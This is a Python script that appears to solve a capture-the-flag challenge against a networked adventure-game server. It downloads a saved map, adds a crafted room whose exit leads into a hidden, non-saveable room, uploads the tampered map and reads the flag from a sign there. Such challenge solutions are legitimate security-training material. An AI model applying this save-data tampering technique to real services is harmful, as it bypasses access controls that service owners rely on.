#!/bin/python

import sys
import json
import base64
import socket

# self written
import binreader
from util import *

ip = sys.argv[1]
port = int(sys.argv[2])
map_name = sys.argv[3]
outmap = sys.argv[4]

"""
STEP 1
Play and download game
"""
sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
sock.connect((ip, port, 0, 0))

# initial connect
val = communicate(sock, {"type": "HELO", "cmd": "new", "map": map_name})
# get the map
b64blob = communicate(sock, {"type": "SAVE"})
print(b64blob)
binblob = base64.b64decode(b64blob)
mapjson = binreader.map2json(None, binblob)

"""
STEP 2
Analyse the map
Find the hidden sign
Built a compatible map
"""
room = None
rname = None
sign = None
for rname in mapjson["rooms"]:
	r = mapjson["rooms"][rname]
	# We assume the only nonsaveable rooms is the final room
	if r["saveable"]:
		continue
	sign = None
	for uuid, el in r["elements"].items():
		if el["id"] == 1: # found the sign
			sign = el
	if not sign: # probably not the secret room
		continue
	room = r
	break # take the first matching room

if not room:
	print("No final room found")
	sys.exit(1)

new_room = {
	"w": 5,
	"h": 5,
	"background": "cave.png",
	"saveable": True,
	"exits": [{
		"x": 4,
		"y": 2,
		"room": rname,
		"targetx": 1,
		"targety": 1,
		"open": True,
		"keypad": None
	}],
	"blocks": [],
	"elements": {}
}
mapjson["rooms"]["exploitroom"] = new_room
mapjson["globals"]["room"] = "exploitroom"
mapjson["globals"]["posx"] = 2
mapjson["globals"]["posy"] = 2

# for debugging, write the map
with open(outmap, "w") as outf:
	json.dump(mapjson, outf, indent='\t')

"""
STEP 3
Upload the custom room
Play to get the flag
"""
play_map = base64.b64encode(json.dumps(mapjson).encode()).decode()
val = communicate(sock, {"type": "HELO", "cmd": "load", "map": play_map})
communicate(sock, {"type": "ROOM", "exit": (4, 2), "pwd": None})
sign_content = communicate(sock, {"type": "INAK", "pos": (sign["x"], sign["y"])})
print(">>", sign_content)

send_json(sock, {"type": "GBYE"}) # end communication. no answer expected
sock.close()

